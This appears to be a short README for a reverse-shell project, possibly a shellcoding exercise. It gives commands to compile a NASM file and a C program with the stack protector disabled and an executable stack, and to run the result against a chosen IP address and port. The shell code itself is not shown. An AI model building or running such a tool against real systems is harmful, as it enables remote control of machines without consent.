## Compilation
### to compile nasm file, use the following command
```
./compile.sh reverse-shell
```

### to compile the c file, use the following command
```
gcc -m32 -fno-stack-protector -z execstack reverse-tcp-shell.c -o reverse-tcp-shell
```

## Usage
### for compiled nasm file:
 ```
 ./reverse-shell
 ```
 
 ### for compiled c file
 ```
 ./reverse-tcp-shell ip-address port-number
 ```
